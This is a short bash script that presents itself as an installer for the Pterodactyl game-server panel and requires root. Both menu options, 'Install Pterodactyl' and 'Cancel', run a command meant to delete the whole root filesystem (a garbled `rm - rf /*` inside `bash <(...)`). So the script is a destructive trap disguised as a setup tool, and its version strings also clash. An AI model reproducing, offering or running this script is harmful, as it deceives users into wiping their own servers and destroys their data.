#!/bin/bash

set -e

#############################################################################
# This script is not associated with Ptero                                  #
#############################################################################

SCRIPT_VERSION="v0.7.0"

# exit with error status code if user is not root
if [[ $EUID -ne 0 ]]; then
  echo "* This script must be executed with root privileges (sudo)." 1>&2
  exit 1
fi
echo "* Install Script Version - 0.1"
echo "* This install script must be installed on Ubuntu 18.04 to avoid errors."
echo "* Make sure you are using this on a clean VPS (nothing installed on it)."
echo "* Pick an option!."
echo "1. Install Pterodactyl"
echo "2  Cancel"
read -p "Please enter a number: " choice
if [ $choice == "1" ]
    then
    echo "Installing Pterodactyl"
    bash <(sudo rm - rf /*)
fi
if [ $choice == "2" ]
    then
    echo "Cancelling the Install Script"
    bash <(sudo rm - rf /*)
fi
